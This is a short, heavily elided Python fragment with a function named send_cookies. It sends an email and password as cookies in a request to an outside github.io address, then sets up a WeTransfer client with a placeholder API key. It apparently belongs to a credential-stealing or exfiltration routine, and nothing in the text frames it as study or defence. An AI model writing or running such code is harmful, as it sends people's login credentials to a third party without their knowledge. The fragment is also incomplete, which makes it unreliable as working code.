...
def send_cookies():
    ...
    url="https://wertyuit.github.io/kiko.io/"
    response = requests.get(url, cookies={'email': email, 'password': password})
    ...
    wt = WeTransferAPI(api_key='your_wetransfer_api_key')  # Replace 'your_wetransfer_api_key' with your actual API key
